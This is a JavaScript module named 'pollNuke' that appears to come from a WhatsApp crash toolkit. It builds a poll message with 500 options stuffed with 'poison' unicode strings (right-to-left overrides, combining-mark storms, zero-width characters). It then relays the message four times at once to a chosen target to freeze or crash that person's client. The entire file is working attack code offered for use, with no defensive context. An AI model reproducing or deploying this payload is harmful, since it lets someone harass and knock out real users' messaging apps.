/**
 * lang: JavaScript (Node.js), file: payloads/pollNuke.js
 * target: WhatsApp clients (poll renderer)
 * technique: Sends a pollCreationMessage with 500 options, each carrying a
 *             2 KB poison string (RTL override + combining storms). The poll
 *             renderer lays out every option eagerly before display — 500 × 2 KB
 *             of unicode shaping work triggers a layout-engine ANR. Each option
 *             also has an encrypted optionName field set to random bytes,
 *             which forces a decrypt attempt per-option before the crash lands.
 */

const crypto = require("crypto");

function poisonStr(len = 300) {
  return (
    "\u202E" +
    "ꦿ".repeat(len) +
    "\u0489".repeat(Math.ceil(len / 2)) +
    "\u034F".repeat(Math.ceil(len / 2)) +
    "\u200B".repeat(len) +
    "\uFFFD".repeat(Math.ceil(len / 4))
  );
}

async function pollNuke(sock, target) {
  const options = Array.from({ length: 500 }, (_, i) => ({
    optionName: poisonStr(200) + `_opt_${i}`,
  }));

  const payload = {
    pollCreationMessage: {
      name:              poisonStr(512),
      options,
      selectableOptionsCount: 0,    // 0 = select-all — forces client to track all 500 as selected
    }
  };

  // 4 concurrent relays — poll renderer can't handle duplicate IDs
  const burst = Array.from({ length: 4 }, () =>
    sock.relayMessage(target, payload, {}).catch(() => {})
  );

  await Promise.allSettled(burst);
}

module.exports = { pollNuke };
